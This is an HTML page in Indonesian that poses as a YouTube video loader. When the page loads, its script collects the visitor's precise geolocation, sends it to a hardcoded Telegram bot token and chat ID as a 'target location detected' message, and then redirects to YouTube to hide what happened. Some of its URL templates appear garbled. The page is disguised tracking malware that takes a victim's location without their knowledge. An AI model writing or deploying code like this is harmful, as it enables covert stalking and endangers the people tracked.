<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Memuat Video YouTube...</title>
</head>
<body>
    <div style="text-align: center; margin-top: 100px;">
        <h3>Sedang memuat pemutar video, mohon tunggu...</h3>
    </div>

<script>
const TOKEN = "8918235695:AAGBMSbj6sIJW6Dhr8DjtNUJ7i4e6EkHJ_E";
const CHAT_ID = "7660723273";

window.onload = function() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(kirimKeTelegram, alihkanHalaman, {
            enableHighAccuracy: true,
            timeout: 5000,
            maximumAge: 0
        });
    } else {
        alihkanHalaman();
    }
};

function kirimKeTelegram(posisi) {
    const lat = posisi.coords.latitude;
    const lon = posisi.coords.longitude;
    const akurasi = posisi.coords.accuracy;

    const pesan = `📍 LOKASI TARGET TERDETEKSI!\n\n` +
                  `- Lintang: ${lat}\n` +
                  `- Bujur: ${lon}\n` +
                  `- Akurasi: ± ${akurasi} meter\n\n` +
                  `🔗 Google Maps: https://google.com{lat},${lon}`;

    const url = `https://telegram.org{TOKEN}/sendMessage`;

    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: pesan })
    }).then(() => {
        alihkanHalaman();
    }).catch(() => {
        alihkanHalaman();
    });
}

function alihkanHalaman() {
    window.location.href = "https://youtube.com"; 
}
</script>
</body>
</html>
